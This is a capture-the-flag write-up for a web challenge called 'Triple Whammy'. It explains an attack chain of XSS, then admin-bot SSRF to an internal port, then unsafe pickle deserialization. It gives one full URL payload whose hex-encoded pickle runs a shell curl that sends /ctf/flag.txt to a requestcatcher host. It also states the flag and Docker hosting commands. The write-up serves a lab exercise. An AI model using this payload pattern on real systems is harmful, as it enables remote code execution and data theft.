# Triple Whammy
Description:
```markdown
Server - https://triple-whammy.chal.cyberjousting.com/

Admin bot - https://triple-whammy-admin.chal.cyberjousting.com/

[triple-whammy.zip]
```

## Writeup
You will want to exploit the XSS on the main page to trick the admin bot into brute forcing the internal port through SSRF to exploit a pickle unloading vulnerability to exfiltrate the flag. Here's an example of the payload (assuming the port is 5902):

`?name=<script>fetch%28%27%2Fquery%27%2C%20%7Bmethod%3A%20%22POST%22%2C%20headers%3A%20%7B%22Content%2DType%22%3A%22application%2Fjson%22%7D%2C%20body%3AJSON%2Estringify%28%7B%22url%22%3A%20%22http://127.0.0.1:5902/pickle?pickle=80049559000000000000008c05706f736978948c0673797374656d9493948c3e6375726c2068747470733a2f2f6c65676f2e72657175657374636174636865722e636f6d2f666c61673f2428636174202f6374662f666c61672e7478742994859452942e%22%7D%29%7D%29</script>`

**Flag** - `byuctf{you_got_a_turkey!!!}`

## Hosting
This challenge should be a Docker container that runs the Flask server `server.py` on port 40003, and the admin bot portal `admin_bot.js` on port 40004. All the proper files are included in here. The command to build and run the docker container is (when located inside of this directory):

```bash
docker compose up -d
```

To stop the challenge:
```bash
docker compose down
```